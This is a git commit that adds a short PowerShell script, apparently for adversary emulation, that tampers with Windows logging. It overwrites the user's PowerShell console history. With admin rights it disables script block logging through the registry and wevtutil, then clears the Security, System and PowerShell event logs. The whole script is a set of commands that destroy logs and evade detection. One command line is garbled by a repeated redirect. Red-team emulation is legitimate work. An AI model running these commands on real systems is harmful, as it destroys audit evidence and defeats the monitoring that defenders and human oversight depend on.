46f7fb3ddf2ecfb0fccfb0eebb64adec4cc023a0
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-09-26 16:14:41 -0400

    Create logManipulation.ps1

---
+++ Adversary Emulation/logManipulation.ps1
@@ -0,0 +1,18 @@
+# Corrupt PowerShell ConsoleHistory Text
+# Permissions Required: Normal
+echo "" > echo "" > C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Disable Script Block Logging
+# PErmissions Required: Admin
+# Method 1: Registry
+Set-ItemProperty -Path HKLM:SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0
+
+# Method 2: wevutil
+wevtutil sl Microsoft-Windows-PowerShell/Operational /e:false
+
+# Delete EVTX Logs
+# Permissions Required: Admin
+wevtutil cl Security
+wevtutil cl "Windows PowerShell"
+wevtutil cl Microsoft-Windows-PowerShell/Operational
+wevtutil cl System
